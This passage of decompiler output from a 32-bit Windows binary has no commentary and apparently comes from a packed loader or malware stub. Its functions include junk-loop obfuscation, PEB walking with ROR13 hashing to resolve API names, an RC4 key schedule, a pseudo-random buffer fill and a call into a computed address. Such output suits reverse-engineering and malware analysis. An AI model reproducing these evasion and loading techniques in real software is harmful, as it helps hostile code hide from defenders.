    LOWORD(v1) = 81;
  }
  v19 = 223;
  v2 = 0;
  for ( k = 0; k <= 1; ++k )
  {
    v3 = 2 * v0;
    v4 = (((_WORD)v19 + (_WORD)v1) & 0x8F0) - v3;
    v2 = v18 + 2 * v2;
    v0 = 2 * v3 - v19;
    v1 = v4 - v16 - v16;
    v16 -= v0;
    v5 = 0;
    if ( (v1 & 0x12) == 0 )
    {
      v5 = v16 < v1;
      v16 -= v1;
    }
    v19 += v1 + v5;
  }
  HIDWORD(v6) = 523;
  v7 = 0;
  for ( m = 0; m <= 2; ++m )
  {
    LODWORD(v6) = 0;
    for ( n = 0; n <= 3; ++n )
    {
      HIDWORD(v6) = (HIDWORD(v6) | 0x9D) + 211;
      if ( (v7 & v13) != 0 )
      {
        v15 -= HIDWORD(v6);
        if ( v7 < SHIDWORD(v6) )
          goto LABEL_15;
        v7 -= 656;
        HIDWORD(v6) += v13;
      }
      v7 |= HIDWORD(v6);
LABEL_15:
      v8 = (__PAIR64__(v15, 0) - v6) >> 32;
      LODWORD(v6) = 0;
      v15 = v8;
    }
  }
  v21 = dword_443038 ^ (dword_443038 << 11);
  dword_443038 = dword_443034;
  for ( ii = 0; ii <= 5; ++ii )
    ;
  dword_443034 = dword_443020;
  dword_443020 = dword_4430A4;
  dword_4430A4 ^= v21 ^ (v21 >> 8) ^ ((unsigned int)dword_4430A4 >> 19);
  for ( jj = 0; jj <= 1; ++jj )
    ;
  return dword_4430A4;
}
// 4025C9: variable 'v18' is possibly undefined
// 4025D1: variable 'v16' is possibly undefined
// 40263C: variable 'v13' is possibly undefined
// 402641: variable 'v15' is possibly undefined
// 443020: using guessed type int dword_443020;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 4430A4: using guessed type int dword_4430A4;

//----- (00402924) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __stdcall sub_402924(int a1)
{
  int result; // eax
  int j; // [esp+4h] [ebp-40h]
  int i; // [esp+18h] [ebp-2Ch]
  int v4[5]; // [esp+30h] [ebp-14h] BYREF

  for ( i = 0; i <= 4; ++i )
    ;
  v4[0] = 49686;
  result = 51982254;
  v4[2] = 51982254;
  for ( j = 0; j <= 1; ++j )
    ;
  if ( ((unsigned int)v4 & 0xF7) == 0 )
    return (int)&STACK[0x3192FDE];
  return result;
}
// 402983: returning address of temporary local variable '%0x3192FDE'
// 402983: exceedingly huge offset into the stack frame

//----- (00402990) --------------------------------------------------------
__int64 __stdcall sub_402990(int a1, int a2, int a3)
{
  __int64 result; // rax
  int i; // [esp+94h] [ebp-Ch]

  for ( i = 0; i <= 4; ++i )
    ;
  dword_443030 = a1;
  dword_443044 = a3;
  result = 0i64;
  dword_443084 = a2;
  return result;
}
// 402A9C: conditional instruction was optimized away because %var_4C.4==52
// 443030: using guessed type int dword_443030;
// 443044: using guessed type int dword_443044;
// 443084: using guessed type int dword_443084;

//----- (00402B34) --------------------------------------------------------
int sub_402B34()
{
  int i; // [esp+8h] [ebp-44h]
  int v2; // [esp+2Ch] [ebp-20h]

  v2 = 20603;
  for ( i = 0; i <= 1; ++i )
    v2 -= v2 / 136;
  return 0;
}

//----- (00402C20) --------------------------------------------------------
int __stdcall sub_402C20(int a1, int (__stdcall *a2)(int, _DWORD, int), int a3)
{
  int v3; // ecx
  int v4; // edx
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // edx
  int v10; // eax
  int v11; // ecx
  char v12; // dl
  int v13; // edx
  int v14; // edx
  bool v15; // cf
  int v16; // eax
  int v17; // edx
  int v18; // ecx
  void *v20; // ecx
  void *v21; // ecx
  int k; // [esp+10h] [ebp-80h]
  int v23[9]; // [esp+30h] [ebp-60h] BYREF
  int v24; // [esp+5Ch] [ebp-34h]
  int v25; // [esp+60h] [ebp-30h]
  int v26; // [esp+64h] [ebp-2Ch]
  int j; // [esp+68h] [ebp-28h]
  int i; // [esp+6Ch] [ebp-24h]
  int *v29; // [esp+70h] [ebp-20h]
  int v30; // [esp+74h] [ebp-1Ch]
  int v31; // [esp+78h] [ebp-18h]
  int v32; // [esp+7Ch] [ebp-14h]
  int v33; // [esp+80h] [ebp-10h] BYREF
  int v34; // [esp+84h] [ebp-Ch]
  int v35; // [esp+88h] [ebp-8h]
  int v36; // [esp+8Ch] [ebp-4h]
  int v37; // [esp+98h] [ebp+8h]

  v36 = 199;
  sub_404138(199);
  v35 = -199;
  v32 = 172;
  sub_4017D4();
  v30 = 73;
  v33 = 68;
  v29 = &v33;
  v31 = 1;
  for ( i = 0; i <= 2; ++i )
  {
    for ( j = 0; j <= 1; ++j )
    {
      sub_404138(v31);
      v30 -= (((unsigned int)(2 * v3) | 0x49B200000000i64) + (unsigned __int64)(unsigned int)(v4 - 2 * v3)) >> 32;
    }
    v34 = 0;
    v26 = 2205;
    v5 = sub_40465C(2205, v33);
    v6 -= 2413;
    v7 = v5 - v6;
    v8 = v33 | v6;
    if ( (v9 & v7) >= 0 )
      v30 |= v8;
    if ( v30 )
    {
      v24 = 0;
      v10 = sub_40445C(0);
      v33 += 19144;
      v13 = v12 & 0x5F;
      if ( (v13 & v31) == 0 )
      {
        v34 &= 0xD79u;
        v25 += v13;
        if ( (v10 & v11) >= 0 )
        {
          v34 += 2646;
          v25 += v13;
        }
        v10 += v33;
      }
      v14 = v32 + v13;
      v30 += 57731;
      v15 = v33 != 0;
      if ( !v33 )
      {
        v10 += v14;
        v24 &= 9u;
        v15 = 0;
        v14 = 0;
      }
      v16 = v10 - (v15 + 234);
      v25 = 1276;
      v24 += v32 + 1276;
      v34 -= v16;
      v30 += v16 + v14 + 17;
    }
  }
  v34 = 2707;
  v32 = -v32;
  dword_4430CC = sub_402544();
  v23[5] = 61164;
  v23[7] = 2245;
  sub_402FA4(v18, v17, 61164, (int)a7qDh, 2245);
  v23[3] = 1900;
  sub_4010E0((int)aLa0cejvub6sy6K, 1900, 1900);
  v37 = a1 - 1;
  if ( v37 )
    return a2(v37, a2, a3);
  v23[1] = 11422;
  v23[2] = 22844;
  sub_404354((int)aO3c1c147ef7jAx, 29846);
  v23[0] = -22844;
  for ( k = 0; k <= 1; ++k )
    ;
  sub_402F60(v23);
  sub_402F60(v20);
  sub_4010E0(0, (int)aZ0o103oncisena, (int)a36ov2pdh6b3uGx);
  sub_402F60(v21);
  sub_4010E0(0, (int)a09bvkklsz2gefu, (int)aUdmebygU56b550);
  sub_402B34();
  return 0;
}
// 402DD0: conditional instruction was optimized away because %var_14.4==AC
// 402C98: variable 'v3' is possibly undefined
// 402C9A: variable 'v4' is possibly undefined
// 402CD3: variable 'v6' is possibly undefined
// 402CDE: variable 'v9' is possibly undefined
// 402D09: variable 'v12' is possibly undefined
// 402D1B: variable 'v11' is possibly undefined
// 402E56: variable 'v18' is possibly undefined
// 402E56: variable 'v17' is possibly undefined
// 402F1E: variable 'v20' is possibly undefined
// 402F38: variable 'v21' is possibly undefined
// 4430CC: using guessed type int dword_4430CC;

//----- (00402F60) --------------------------------------------------------
void *__thiscall sub_402F60(void *this)
{
  return this;
}

//----- (00402FA4) --------------------------------------------------------
int __fastcall sub_402FA4(int a1, int a2, int a3, int a4, int a5)
{
  int j; // [esp+Ch] [ebp-2Ch]
  int i; // [esp+10h] [ebp-28h]

  for ( i = 0; i <= 5; ++i )
    ;
  for ( j = 0; j <= 4; ++j )
    ;
  return 2 * a1;
}

//----- (00402FF0) --------------------------------------------------------
int sub_402FF0()
{
  int v0; // edx
  int v1; // ecx
  int v2; // edx
  int v3; // ecx
  int j; // [esp+8h] [ebp-20h]
  int i; // [esp+18h] [ebp-10h]

  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 5; ++j )
    {
      GetTickCount();
      sub_402FA4(v1, v0, 161, 53, 0);
    }
  }
  return sub_401330(v3, v2);
}
// 403059: variable 'v1' is possibly undefined
// 403059: variable 'v0' is possibly undefined
// 403070: variable 'v3' is possibly undefined
// 403070: variable 'v2' is possibly undefined

//----- (0040307C) --------------------------------------------------------
void __usercall __noreturn start(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ett
  int v6; // eax
  int v7; // edx
  int v8; // ecx
  void *v9; // ecx
  void *v10; // ecx
  void *v11; // ecx
  void *v12; // ecx
  void *v13; // ecx
  __int64 v14; // rax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // edx
  int v19; // eax
  int (*v20)(); // ecx
  int v21; // ecx
  unsigned int v22; // edx
  unsigned int v23; // ecx
  __int64 v24; // rax
  int v25; // ecx
  int v26; // ecx
  int v27; // eax
  int v28; // edx
  int v29; // ecx
  int v30; // ecx
  int v31; // edx
  void *v32; // ecx
  unsigned int v33; // eax
  unsigned int v34; // edx
  int v35; // ecx
  int v36; // edx
  bool v37; // cf
  int v38; // eax
  int v39; // ecx
  bool v40; // cf
  int i5; // [esp+1Ch] [ebp-2CCh]
  int v42; // [esp+5Ch] [ebp-28Ch]
  int i4; // [esp+60h] [ebp-288h]
  int v44; // [esp+64h] [ebp-284h]
  int v45; // [esp+68h] [ebp-280h]
  int v46; // [esp+6Ch] [ebp-27Ch]
  int v47; // [esp+70h] [ebp-278h]
  int v48; // [esp+74h] [ebp-274h]
  int v49; // [esp+74h] [ebp-274h]
  int v50; // [esp+78h] [ebp-270h]
  int i3; // [esp+98h] [ebp-250h]
  int v52; // [esp+A0h] [ebp-248h]
  int v53; // [esp+A4h] [ebp-244h]
  char v54; // [esp+A8h] [ebp-240h]
  int i2; // [esp+ACh] [ebp-23Ch]
  int i1; // [esp+B4h] [ebp-234h]
  int v57; // [esp+C4h] [ebp-224h]
  int (*v58)(); // [esp+DCh] [ebp-20Ch]
  int v59; // [esp+E8h] [ebp-200h]
  int nn; // [esp+F0h] [ebp-1F8h]
  int mm; // [esp+100h] [ebp-1E8h]
  int v62; // [esp+104h] [ebp-1E4h]
  int v63; // [esp+108h] [ebp-1E0h]
  int kk; // [esp+10Ch] [ebp-1DCh]
  int jj; // [esp+114h] [ebp-1D4h]
  int v66; // [esp+170h] [ebp-178h]
  int ii; // [esp+224h] [ebp-C4h]
  int v68; // [esp+248h] [ebp-A0h]
  int n; // [esp+24Ch] [ebp-9Ch]
  int m; // [esp+258h] [ebp-90h]
  unsigned int v71; // [esp+25Ch] [ebp-8Ch]
  int k; // [esp+2B0h] [ebp-38h]
  int j; // [esp+2BCh] [ebp-2Ch]
  int i; // [esp+2C8h] [ebp-20h]

  for ( i = 0; i <= 5; ++i )
  {
    for ( j = 0; j <= 3; ++j )
      ;
  }
  for ( k = 0; k <= 2; ++k )
    ;
  v3 = 0;
  for ( m = 0; m <= 5; ++m )
  {
    v71 = 15436;
    v4 = 15436;
    for ( n = 0; n <= 5; ++n )
    {
      v68 -= 11919;
      if ( v71 >= 0x2E8F )
        v4 += 246;
      v5 = ((unsigned int)v4 + (unsigned __int64)(unsigned int)v3) >> 32;
      v6 = 2 * (v4 + v3);
      v3 = v3 - v5 - v6;
      if ( v3 != v6 )
        v6 ^= v3;
      v71 -= 1284;
      v4 = v6 - 60059;
    }
  }
  for ( ii = 0; ii <= 2; ++ii )
    ;
  sub_40108C(55146, 55146);
  sub_404578();
  sub_404578();
  sub_404138(0);
  sub_404578();
  sub_404138(0);
  sub_404138(0);
  GetStdHandle(0xFFFFFFF5);
  AddAtomA(0);
  sub_4010E0(99, (int)aDy, (int)a9Uk38ivsec45xj);
  sub_40108C(19511, 61414);
  sub_40108C(19511, 61414);
  sub_402FA4(v8, v7, 23836, (int)aXY4, 61414);
  sub_4010E0((int)aQ_0, 56564, 56564);
  sub_4010E0((int)asc_40EFC5, 56564, 56564);
  sub_402F60(v9);
  sub_402B34();
  sub_402B34();
  sub_402B34();
  sub_404064(v10, 7, (void (__stdcall *)(int, _DWORD, int))sub_401990, (int)sub_402C20);
  sub_401000(4039, (int)a7syhrucmatwlex, 4039);
  sub_402F60(v11);
  sub_402924(51298);
  sub_4017D4();
  sub_4017D4();
  sub_402F60(v12);
  v66 = sub_401B4C(1540034);
  sub_402F60(v13);
  for ( jj = 0; jj <= 3; ++jj )
    sub_402924(0);
  sub_404578();
  for ( kk = 0; kk <= 2; ++kk )
    sub_40465C(22, 0);
  for ( mm = 0; mm <= 2; ++mm )
  {
    v62 = 9997;
    for ( nn = 0; nn <= 3; ++nn )
    {
      sub_4010E0(v62, 0, 49875);
      sub_4010E0(v62, 0, 49875);
      v14 = sub_404578();
      v59 -= HIDWORD(v14);
      sub_4010E0(v62, ((int)v14 + v15 - HIDWORD(v14) < (unsigned int)v14) + 80241, 49875);
      sub_404578();
      v16 = sub_40108C((int)aG2kniiyAxs369p, v62);
      v19 = v16 - v18;
      if ( (v59 & 0x28) != 0 )
      {
        v62 += v17;
        v63 -= v19;
      }
    }
    sub_402B34();
    v63 = 47;
  }
  sub_404578();
  if ( v66 )
    v20 = sub_402FF0;
  else
    v20 = sub_401778;
  v58 = v20;
  sub_402F60(v20);
  sub_4017D4();
  sub_4017D4();
  sub_4010E0(0, 695, 0);
  sub_4017D4();
  v57 = 1342;
  sub_40465C(56440, 57782);
  for ( i1 = 0; i1 <= 3; ++i1 )
  {
    v22 = 0;
    for ( i2 = 0; i2 <= 1; ++i2 )
    {
      v23 = v21 | 0x5A21;
      if ( v22 < v23 || (v23 |= v22, (v54 & 0xBE) != 0) )
      {
        v57 &= 0xF5u;
        v53 -= 29050;
      }
      v57 += v23;
      sub_404354(2347, 57782);
      sub_404354(v37 + 2508, 57782);
      v24 = sub_404578();
      v26 = 2 * v25;
      if ( (v26 & v57) == 0 )
        HIDWORD(v24) += 210;
      v22 = HIDWORD(v24) - v26;
      v21 = 0;
    }
  }
  v52 = ((int (__fastcall *)(_DWORD, unsigned int))v58)(0, v22);
  for ( i3 = 0; i3 <= 3; ++i3 )
  {
    sub_40445C(175);
    sub_40465C((int)a38309mbfjC8nrh, 175);
  }
  sub_40108C(12, 12);
  sub_40108C(12, 12);
  sub_40445C(12);
  sub_402990(a2, a3, a1);
  sub_404138(1442);
  v50 = 1739;
  v47 = 0;
LABEL_42:
  for ( i4 = 0; i4 <= 2; ++i4 )
  {
    v27 = sub_404138(0);
    v30 = v29 - (v37 + v28);
    if ( v30 == v45 )
    {
      v28 -= v30;
      v46 += 4689;
      if ( (v27 & v30) == 0 )
        v30 = 0;
      v45 &= v28;
    }
    v31 = v28 + 1856;
  }
  v46 = 178;
  v44 = 0;
  sub_402FA4(v30, v31, 178, (int)aVbj8Na9fdrl326, 0);
  v42 = 0;
  while ( 1 )
  {
    v33 = (unsigned int)sub_402F60(v32);
    v49 = v48 + 185;
    if ( (v35 & v50) == 0 )
      goto LABEL_52;
    v46 = v35 + v46 - 5516;
    v35 ^= v33;
    if ( !v35 )
      break;
LABEL_53:
    v45 = 18389;
    v36 = 0;
    v48 = v33 - v35 + 404580;
    v44 += 118;
    v38 = v50 * (v44 + (v46 | 0x47D5));
    v37 = (unsigned __int64)(v50 * (__int64)(v44 + (v46 | 0x47D5))) >> 32 != 0;
    v50 = v38;
    v39 = v37;
    if ( (v38 & v44) != 0 )
    {
      v36 = -18389;
      v39 = ((__PAIR64__(v37, 0) - __PAIR64__(v38, 18389)) >> 32) & 0xFFFFB82B;
      v40 = 0;
      if ( v39 )
      {
        v39 -= 18389;
        v40 = __CFADD__(v39, -18389);
        v36 = v39 - 18389;
      }
      v44 -= v40 + v36;
    }
    v32 = (void *)(v39 - v36);
    if ( ++v42 > 1 )
    {
      if ( ++v47 > 5 )
      {
        sub_402F60(v32);
        sub_401818(55650, 55650, 55650, 55650);
        sub_404138((int)aK8zua9qi3Ks7nF);
        sub_404138((int)a0pvyytvko9jYp3);
        sub_404354((int)a0vba2zyf, 242);
        sub_404138((int)a3gf1r6b5knlqdm);
        sub_404354((int)aFzvmkrbx, 242);
        sub_404138(242);
        sub_404354(0, 0);
        ((void (*)(void))(v52 + v66))();
        for ( i5 = 0; i5 <= 4; ++i5 )
        {
          sub_40465C(0, (int)aB);
          sub_40465C(0, (int)asc_40EDAB);
          sub_402B34();
          sub_40465C(0, (int)a5);
          sub_402B34();
          sub_40108C(0, (int)aV2S22a);
        }
        sub_40465C((int)aENIc7uvujh5i9n, 0);
        ExitProcess(0);
      }
      goto LABEL_42;
    }
  }
  v37 = v34 < v33;
  v34 -= v33;
  v33 += v50 + v37;
LABEL_52:
  v33 += v49 + v34;
  goto LABEL_53;
}
// 4030F8: conditional instruction was optimized away because %var_18.4==CEC4
// 40338B: conditional instruction was optimized away because %var_F4.4==0
// 4036FD: conditional instruction was optimized away because %var_1A0.4==E78E
// 4037EF: conditional instruction was optimized away because %var_1CC.4==0
// 403A69: conditional instruction was optimized away because %var_22C.4==DC78
// 403F67: conditional instruction was optimized away because %var_2B0.4==1A7E
// 4031D3: variable 'v68' is possibly undefined
// 4035FB: variable 'v8' is possibly undefined
// 4035FB: variable 'v7' is possibly undefined
// 403636: variable 'v9' is possibly undefined
// 403656: variable 'v10' is possibly undefined
// 40367B: variable 'v11' is possibly undefined
// 4037A5: variable 'v12' is possibly undefined
// 4037E3: variable 'v13' is possibly undefined
// 4038D1: variable 'v59' is possibly undefined
// 4038CD: variable 'v15' is possibly undefined
// 40391F: variable 'v18' is possibly undefined
// 403933: variable 'v17' is possibly undefined
// 403939: variable 'v63' is possibly undefined
// 403A8C: variable 'v21' is possibly undefined
// 403A9E: variable 'v54' is possibly undefined
// 403AB8: variable 'v53' is possibly undefined
// 403AE9: variable 'v37' is possibly undefined
// 403B25: variable 'v25' is possibly undefined
// 403CB8: variable 'v29' is possibly undefined
// 403CB8: variable 'v28' is possibly undefined
// 403CC0: variable 'v45' is possibly undefined
// 403CC4: variable 'v46' is possibly undefined
// 403D35: variable 'v32' is possibly undefined
// 403D41: variable 'v48' is possibly undefined
// 403D4B: variable 'v35' is possibly undefined
// 403D67: variable 'v34' is possibly undefined

//----- (00404064) --------------------------------------------------------
int __thiscall sub_404064(void *this, int a2, void (__stdcall *a3)(int, _DWORD, int), int a4)
{
  void *v4; // ecx
  void *v5; // ecx
  void *v6; // ecx
  void *v7; // ecx
  int v8; // edx
  int v9; // edx
  int v10; // ecx

  sub_402F60(this);
  sub_402F60(v4);
  sub_402F60(v5);
  sub_402F60(v6);
  sub_402F60(v7);
  sub_402924(0);
  sub_40465C((int)a3g8, (int)a4pLikr46kzc);
  sub_4017D4();
  sub_4017D4();
  sub_40445C(144);
  sub_4017D4();
  sub_40445C(144);
  sub_40445C(0);
  a3(a2, a3, a4);
  sub_402FA4(0, v8, 0, 0, 0);
  sub_402FA4(v10, v9, 0, 0, 0);
  sub_404354(0, 0);
  return sub_401000(0, 0, 0);
}
// 40406F: variable 'v4' is possibly undefined
// 404074: variable 'v5' is possibly undefined
// 40407E: variable 'v6' is possibly undefined
// 404083: variable 'v7' is possibly undefined
// 404101: variable 'v8' is possibly undefined
// 40410F: variable 'v10' is possibly undefined
// 40410F: variable 'v9' is possibly undefined

//----- (00404138) --------------------------------------------------------
int __stdcall sub_404138(int a1)
{
  int j; // [esp+0h] [ebp-5Ch]
  int i; // [esp+30h] [ebp-2Ch]

  for ( i = 0; i <= 2; ++i )
    ;
  for ( j = 0; j <= 3; ++j )
    ;
  return 0;
}

//----- (004042E0) --------------------------------------------------------
int __stdcall sub_4042E0(int a1, int a2)
{
  int j; // [esp+4h] [ebp-24h]
  int i; // [esp+10h] [ebp-18h]

  for ( i = 0; i <= 4; ++i )
  {
    for ( j = 0; j <= 2; ++j )
      ;
  }
  GetLastError();
  return a2 ^ a1;
}

//----- (00404354) --------------------------------------------------------
int *__stdcall sub_404354(int a1, int a2)
{
  int *result; // eax
  int m; // [esp+8h] [ebp-38h]
  int k; // [esp+14h] [ebp-2Ch]
  int j; // [esp+18h] [ebp-28h]
  int i; // [esp+20h] [ebp-20h]
  int v7; // [esp+34h] [ebp-Ch]

  a2 = 0;
  for ( i = 0; i <= 1; ++i )
    ;
  for ( j = 0; j <= 4; ++j )
  {
    for ( k = 0; k <= 4; ++k )
      ;
  }
  v7 = 1;
  for ( m = 0; m <= 2; ++m )
  {
    a1 = 105;
    result = &a1;
    v7 += 105;
  }
  return result;
}

//----- (0040445C) --------------------------------------------------------
int __stdcall sub_40445C(int a1)
{
  int v1; // eax
  int j; // [esp+14h] [ebp-6Ch]
  int i; // [esp+44h] [ebp-3Ch]
  int v5; // [esp+4Ch] [ebp-34h]

  for ( i = 0; i <= 5; ++i )
    ;
  v5 = 0;
  for ( j = 0; j <= 4; ++j )
  {
    v1 = 2 * v5;
    v5 *= 2;
    if ( v5 != 2383 )
      v1 = 2984;
  }
  return v1 + 2515 + __CFADD__(v1, 2515) + v1 + 2515;
}
// 404496: conditional instruction was optimized away because %var_1C.4==8C

//----- (00404578) --------------------------------------------------------
__int64 sub_404578()
{
  int j; // [esp+0h] [ebp-4Ch]
  int i; // [esp+14h] [ebp-38h]
  int v3; // [esp+38h] [ebp-14h] BYREF
  int v4; // [esp+3Ch] [ebp-10h]
  int v5; // [esp+40h] [ebp-Ch]

  for ( i = 0; i <= 3; ++i )
  {
    v4 = 1761;
    v5 = 0;
    v3 = 0;
  }
  v4 = 732;
  v3 = 56457;
  for ( j = 0; j <= 5; ++j )
    ;
  return (unsigned int)&STACK[0xDD62] + (unsigned int)&v3 + ((unsigned int)j < 5);
}
// 404613: conditional instruction was optimized away because %var_24.4==DEC3

//----- (0040465C) --------------------------------------------------------
int __stdcall sub_40465C(int a1, int a2)
{
  unsigned int v2; // eax
  unsigned int v3; // edx
  unsigned int v4; // eax
  bool v5; // cf
  int v6; // ett
  int k; // [esp+20h] [ebp-68h]
  int j; // [esp+2Ch] [ebp-5Ch]
  int i; // [esp+34h] [ebp-54h]
  unsigned int v11; // [esp+7Ch] [ebp-Ch]

  v2 = 0;
  for ( i = 0; i <= 1; ++i )
  {
    v3 = 0;
    for ( j = 0; j <= 1; ++j )
    {
      v4 = v2 - v3 - v3;
      v5 = __CFADD__(v3, v4);
      v6 = ((v3 | 0x295F00000000i64) + (unsigned __int64)v4) >> 32;
      v2 = v3 + v4;
      v5 = v11 < (unsigned int)v5 + 10591;
      v11 -= v6;
      v3 -= v5;
    }
    v2 = 0;
    for ( k = 0; k <= 2; ++k )
      ;
  }
  return 0;
}
// 4047F0: conditional instruction was optimized away because %var_14.4==B5EC
// 404799: variable 'v11' is possibly undefined

//----- (00404C01) --------------------------------------------------------
void __usercall sub_404C01(int a1@<ebx>)
{
  int v1; // ecx
  _BYTE *v2; // edi
  int v3; // [esp-4h] [ebp-4h]

  v1 = 0x2000;
  dword_443138 += a1 ^ 0x6C61;
  v2 = &unk_4239D4;
  do
  {
    v3 = v1;
    *v2++ = sub_404CB5();
    dword_44322C -= 16678;
    dword_443104 = 22691;
    v1 = v3 - 1;
  }
  while ( v3 != 1 );
  LOBYTE(dword_443144) = dword_443144 + 110;
  JUMPOUT(0x404A0E);
}
// 406F8C: control flows out of bounds to 404A0E
// 443104: using guessed type int dword_443104;
// 443138: using guessed type int dword_443138;
// 443144: using guessed type int dword_443144;
// 44322C: using guessed type int dword_44322C;

//----- (00404CB5) --------------------------------------------------------
unsigned int sub_404CB5()
{
  unsigned int v0; // eax
  unsigned int result; // eax
  unsigned int v2; // ecx

  v0 = dword_443038 ^ (dword_443038 << 11);
  dword_443038 = dword_443034;
  dword_443184 = 29135;
  LOBYTE(dword_4431AC) = dword_4431AC + 116;
  dword_443034 = dword_443020;
  dword_443230 += 29135;
  dword_443020 = dword_4430A4;
  LOBYTE(dword_4431A4) = dword_4431A4 - 125;
  v2 = dword_4430A4 ^ ((unsigned int)dword_4430A4 >> 19);
  dword_4431FC = v2 + v0;
  dword_4430DC = (v0 >> 8) ^ v0 ^ v2;
  result = (v0 >> 8) ^ v0 ^ v2;
  dword_4430A4 = result;
  return result;
}
// 443020: using guessed type int dword_443020;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 4430A4: using guessed type int dword_4430A4;
// 4430DC: using guessed type int dword_4430DC;
// 443184: using guessed type int dword_443184;
// 4431A4: using guessed type int dword_4431A4;
// 4431AC: using guessed type int dword_4431AC;
// 4431FC: using guessed type int dword_4431FC;
// 443230: using guessed type int dword_443230;

//----- (00405021) --------------------------------------------------------
struct _LIST_ENTRY *sub_405021()
{
  struct _LIST_ENTRY *Flink; // edx
  int Flink_low; // eax
  struct _LIST_ENTRY *v2; // esi
  int v3; // edi
  int v4; // ecx
  struct _LIST_ENTRY *v5; // ebx
  struct _LIST_ENTRY *v6; // ecx
  struct _LIST_ENTRY *result; // eax
  __int64 v8; // kr00_8

  Flink = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink;
  do
  {
    v2 = Flink[5].Flink;
    dword_44313C = 11734;
    v4 = 24;
    v3 = 0;
    do
    {
      dword_443228 = 15773;
      Flink_low = LOBYTE(v2->Flink);
      v2 = (struct _LIST_ENTRY *)((char *)v2 + 1);
      byte_4431B8 -= 111;
      if ( (char)Flink_low >= 97 )
      {
        dword_443154 += 8620;
        LOBYTE(Flink_low) = Flink_low - 32;
      }
      v3 = Flink_low + __ROR4__(v3, 13);
      --v4;
    }
    while ( v4 );
    LOBYTE(dword_443140) = dword_443140 + 66;
    v5 = Flink[2].Flink;
    v6 = v5;
    Flink = Flink->Flink;
    LOBYTE(v6) = -60;
  }
  while ( (v3 ^ 0xA77CDD71) != -852074198 );
  result = v5;
  v8 = ((unsigned int)dword_4431D8 | 0xA8400000000i64) + 0x47F500001930i64;
  dword_4431D8 += 6448;
  dword_4431AC = (unsigned int)v6 ^ 0x2791;
  LOBYTE(dword_443148) = -25;
  dword_4431EC = HIDWORD(v8);
  LOBYTE(dword_4431EC) = 113;
  return result;
}
// 44313C: using guessed type int dword_44313C;
// 443140: using guessed type int dword_443140;
// 443148: using guessed type int dword_443148;
// 443154: using guessed type int dword_443154;
// 4431AC: using guessed type int dword_4431AC;
// 4431B8: using guessed type char byte_4431B8;
// 4431D8: using guessed type int dword_4431D8;
// 4431EC: using guessed type int dword_4431EC;
// 443228: using guessed type int dword_443228;

//----- (00405C64) --------------------------------------------------------
void __usercall sub_405C64(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  LOBYTE(dword_4431E4) = 38;
  qmemcpy(a2, a3, a1);
}
// 4431E4: using guessed type int dword_4431E4;

//----- (00405D8F) --------------------------------------------------------
_BYTE *__cdecl sub_405D8F(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (0040618A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
char *__thiscall sub_40618A(void *this, int a2)
{
  unsigned int v3; // [esp-8h] [ebp-8h] BYREF

  ((void (__fastcall *)(void *, int))loc_40D979)(this, 27372);
  MEMORY[0] = &v3;
  ++MEMORY[0x7DD0];
  __writefsdword(0, v3);
  return sub_4061BD(a2);
}
// 4061B1: positive sp value 10 has been found

//----- (004061BD) --------------------------------------------------------
char *__cdecl sub_4061BD(int a1)
{
  struct _LIST_ENTRY *v1; // eax
  struct _LIST_ENTRY *v2; // ebx
  _DWORD *v3; // edi
  unsigned int i; // esi
  unsigned __int16 *v6; // [esp+18h] [ebp-Ch]
  _DWORD *v7; // [esp+1Ch] [ebp-8h]
  int v8; // [esp+20h] [ebp-4h]

  v1 = sub_405021();
  v2 = v1;
  v3 = (struct _LIST_ENTRY **)((char *)&v1->Flink + *(unsigned int *)((char *)&v1[15].Flink + (unsigned int)v1[7].Blink));
  if ( !HIWORD(a1) )
  {
    v8 = (unsigned __int16)a1 - v3[4];
    return (char *)v2 + *(unsigned int *)((char *)&v2->Flink + 4 * v8 + v3[7]);
  }
  v7 = (struct _LIST_ENTRY **)((char *)&v1->Flink + v3[8]);
  v6 = (unsigned __int16 *)((char *)v1 + v3[9]);
  for ( i = 0; v3[6] > i; ++i )
  {
    if ( (sub_406F40((_BYTE *)v2 + *v7) ^ 0xA77CDD71) == a1 )
    {
      v8 = *v6;
      break;
    }
    ++v7;
    ++v6;
  }
  if ( v3[6] != i )
    return (char *)v2 + *(unsigned int *)((char *)&v2->Flink + 4 * v8 + v3[7]);
  return 0;
}
// 40579B: variable 'v8' is possibly undefined

//----- (0040661F) --------------------------------------------------------
int __cdecl sub_40661F(int a1, int a2, unsigned __int8 *a3)
{
  unsigned int v3; // esi
  unsigned __int8 *v4; // eax
  unsigned __int8 v5; // cl
  int v6; // eax
  int result; // eax
  int v8; // et2
  unsigned __int8 v9; // bl
  unsigned int i; // esi
  unsigned __int8 *v11; // [esp+Ch] [ebp-8h]
  unsigned __int8 v12; // [esp+13h] [ebp-1h]

  v3 = 0;
  v4 = a3;
  do
  {
    v5 = v3++;
    *v4++ = v5;
  }
  while ( v3 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v12 = 0;
  v9 = 0;
  v11 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v9 = (v9 + *v11 + *(unsigned __int8 *)(a1 + v12)) % 256;
    sub_405D8F(&a3[i], &a3[v9]);
    v6 = v12 + 1;
    v8 = v6 % a2;
    result = v6 / a2;
    v12 = v8;
    ++v11;
  }
  return result;
}

//----- (00406BA8) --------------------------------------------------------
char __cdecl sub_406BA8(int a1, int a2, int a3)
{
  char result; // al
  char v4; // [esp+17h] [ebp-1h]

  v4 = *(_BYTE *)(a3 + 257);
  if ( a2 )
    JUMPOUT(0x406355);
  *(_BYTE *)(a3 + 256) = *(_BYTE *)(a3 + 256);
  result = v4;
  *(_BYTE *)(a3 + 257) = v4;
  return result;
}
// 4067A3: control flows out of bounds to 406355

//----- (00406E8A) --------------------------------------------------------
